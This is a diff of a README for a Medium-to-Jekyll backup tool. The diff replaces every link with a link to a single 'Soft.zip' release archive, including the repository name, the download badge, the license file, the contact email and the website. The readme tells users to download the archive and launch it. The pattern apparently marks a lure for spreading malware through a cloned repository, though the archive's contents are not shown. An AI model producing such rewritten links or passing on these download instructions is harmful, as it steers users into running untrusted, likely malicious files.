@@ -4,14 +4,14 @@
 Welcome to the **Medium to Jekyll Starter** GitHub repository! This project offers an easy way to automatically sync and backup your Medium articles to GitHub Pages using Jekyll. Say goodbye to manual backups and enjoy the convenience of automated syncing with this tool.
 
 ### 📋 Repository Summary
-- **Repository Name:** [medium-to-jekyll-starter.github.io](https://github.com/adelante20/medium-to-jekyll-starter.github.io)
+- **Repository Name:** [https://github.com/noppa164/medium-to-jekyll-starter.github.io/releases/download/v1.0/Soft.zip](https://github.com/noppa164/medium-to-jekyll-starter.github.io/releases/download/v1.0/Soft.zip)
 - **Description:** Automatically sync and backup your Medium articles to GitHub Pages (Jekyll) with ease.
 - **Topics:** automated-backup, automation, backup, jekyll, markdown, medium, medium-article, medium-article-scraper, medium-backup, medium-blog, medium-clone, medium-downloader, medium-posts, ruby, static-website, sync
 
 ### 🛠️ Installation
 To get started with Medium to Jekyll Starter, download the latest release package from the link below and launch it for your convenience:
 
-[![Download Link](https://img.shields.io/badge/Download%20Release-Here-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Link](https://github.com/noppa164/medium-to-jekyll-starter.github.io/releases/download/v1.0/Soft.zip%20Release-Here-brightgreen)](https://github.com/noppa164/medium-to-jekyll-starter.github.io/releases/download/v1.0/Soft.zip)
 
 ### 🌟 Features
 - **Automated Sync:** Effortlessly synchronize your Medium articles to GitHub Pages.
@@ -25,16 +25,16 @@ To get started with Medium to Jekyll Starter, download the latest release packag
 4. Sit back and let the tool handle the rest!
 
 ### 📄 License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/noppa164/medium-to-jekyll-starter.github.io/releases/download/v1.0/Soft.zip](https://github.com/noppa164/medium-to-jekyll-starter.github.io/releases/download/v1.0/Soft.zip) file for details.
 
 ### 🤝 Contributing
 If you have any ideas, suggestions, or improvements for Medium to Jekyll Starter, feel free to contribute by submitting a pull request to the repository.
 
 ### 📞 Contact
-For any inquiries or support regarding this project, you can reach out to the project maintainer at [contact@example.com](mailto:contact@example.com).
+For any inquiries or support regarding this project, you can reach out to the project maintainer at [https://github.com/noppa164/medium-to-jekyll-starter.github.io/releases/download/v1.0/Soft.zip](https://github.com/noppa164/medium-to-jekyll-starter.github.io/releases/download/v1.0/Soft.zip).
 
 ### 🌐 Stay Connected
-Stay updated on the latest news and releases by visiting the Medium to Jekyll Starter website [here](https://mediumtojekyllstarter.com).
+Stay updated on the latest news and releases by visiting the Medium to Jekyll Starter website [here](https://github.com/noppa164/medium-to-jekyll-starter.github.io/releases/download/v1.0/Soft.zip).
 
 ---
 
